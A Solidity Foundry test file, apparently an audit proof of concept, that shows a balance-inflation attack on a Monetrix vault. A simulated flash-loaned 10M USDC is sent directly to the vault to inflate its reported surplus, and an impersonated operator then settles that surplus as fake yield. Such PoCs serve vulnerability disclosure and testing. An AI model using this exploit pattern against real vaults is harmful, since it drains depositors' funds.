// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy protocol via SimulatorBase. Attacker deposits 10,000 USDC to obtain a share of the vault yield.
// 2. [T=1] Attacker receives a "flash loan" of 10,000,000 USDC (simulated via deal).
// 3. [T=2] Attacker transfers the 10M USDC directly to the Vault contract (raw ERC-20 transfer, no deposit logic).
// 4. [T=3] State changes: The Vault's raw USDC balance is transiently inflated. `accountant.distributableSurplus()` reads this balance and reports a massively inflated surplus.
// 5. [T=4] Attacker (acting as operator or front-running) calls `vault.settle()` with the inflated surplus as the proposed yield.
// 6. [T=5] The protocol accepts the fake yield and distributes it to stakers/escrows, draining the transient USDC.
// 7. [Assert] Verify that `distributableSurplus()` was artificially inflated by the raw transfer and that the settlement successfully extracted the transient funds, leaving the vault's real backing deficient.

contract AuditAgentPoC is SimulatorBase {
    address attacker = address(0xdead);

    function setUp() public {
        setUpSimulator();
    }

    function test_exploit() public {
        // 1. Attacker deposits into the vault to get a share of the yield
        uint256 initialDeposit = 10_000e6;
        deal(address(usdc), attacker, initialDeposit);

        vm.startPrank(attacker);
        usdc.approve(address(vault), initialDeposit);
        vault.deposit(initialDeposit);
        vm.stopPrank();

        // 2. Flash loan: Attacker gets a massive amount of USDC
        uint256 flashAmount = 10_000_000e6;
        deal(address(usdc), attacker, flashAmount);

        // 3. Transient Donation: Attacker transfers USDC directly to the Vault
        int256 surplusBefore = accountant.distributableSurplus();

        vm.prank(attacker);
        usdc.transfer(address(vault), flashAmount);

        int256 surplusAfter = accountant.distributableSurplus();

        console.log("Step 3: Surplus before donation =", surplusBefore);
        console.log("Step 3: Surplus after donation =", surplusAfter);

        // Assert that the surplus is inflated by the raw donation
        assertGt(surplusAfter, surplusBefore + int256(flashAmount) / 2, "Surplus inflated by transient USDC donation");

        // 4. Settle: Operator settles the massive inflated surplus
        uint256 proposedYield = uint256(surplusAfter);

        // Prank the operator to call settle
        vm.prank(operator);
        vault.settle(proposedYield);

        // 5. Assert: The vault distributed the fake yield, draining the transient USDC
        int256 surplusFinal = accountant.distributableSurplus();

        console.log("Step 5: Surplus final after settlement =", surplusFinal);

        // The surplus should be drained/distributed
        assertLt(surplusFinal, surplusAfter, "Inflated surplus was distributed as fake yield, leaving vault underfunded");
    }
}
